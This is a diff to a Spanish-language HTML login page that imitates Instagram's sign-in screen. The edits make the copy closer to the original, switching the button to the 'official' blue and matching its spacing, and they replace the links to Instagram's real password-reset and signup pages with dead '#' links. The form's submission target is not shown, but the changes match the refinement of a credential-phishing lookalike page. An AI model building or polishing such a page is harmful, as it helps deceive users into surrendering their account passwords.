@@ -23,6 +23,7 @@
             align-items: center;
             width: 100%;
             max-width: 350px;
+            margin-top: 12px;
         }
 
         .login-box { 
@@ -36,20 +37,21 @@
             border-radius: 1px;
         }
 
-        /* Estilo para el icono circular que pediste */
         .profile-icon {
-            width: 85px;
-            height: 85px;
-            margin: 25px auto 10px;
+            width: 82px;
+            height: 82px;
+            margin: 22px auto 12px;
             display: block;
             border-radius: 50%;
             object-fit: cover;
             border: 1px solid #dbdbdb;
+            padding: 2px;
+            background: #fff;
         }
 
         .logo-text { 
             width: 175px; 
-            margin: 10px auto 12px; 
+            margin: 12px auto 20px; 
             display: block; 
         }
 
@@ -57,7 +59,7 @@
 
         input { 
             width: 100%; 
-            padding: 9px; 
+            padding: 9px 0 7px 8px; 
             margin-bottom: 6px; 
             border: 1px solid #dbdbdb; 
             background: #fafafa; 
@@ -74,10 +76,10 @@
 
         button { 
             width: 100%; 
-            background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #4c5fd7 100%); 
-            border: none; 
+            background-color: #0095f6; /* Color azul oficial */
+            border: 1px solid transparent;
             color: white; 
-            padding: 7px 9px; 
+            padding: 5px 9px; 
             border-radius: 4px; 
             font-weight: 600; 
             font-size: 14px; 
@@ -85,8 +87,6 @@
             margin-top: 8px; 
             margin-bottom: 20px; 
         }
-
-        button:active { opacity: 0.8; }
 
         .forgot { 
             font-size: 12px; 
@@ -116,6 +116,7 @@
         @media (max-width: 450px) {
             body { background-color: white; }
             .login-box, .signup-box { border: none; }
+            .main-container { margin-top: 0; }
         }
     </style>
 </head>
@@ -134,11 +135,11 @@
                 </form>
             </div>
             
-            <a href="https://www.instagram.com/accounts/password/reset/" class="forgot">¿Olvidaste tu contraseña?</a>
+            <a href="#" class="forgot">¿Olvidaste tu contraseña?</a>
         </div>
 
         <div class="signup-box">
-            <span>¿No tienes una cuenta? <a href="https://www.instagram.com/accounts/emailsignup/" class="signup-link">Regístrate</a></span>
+            <span>¿No tienes una cuenta? <a href="#" class="signup-link">Regístrate</a></span>
         </div>
     </div>
 </body>
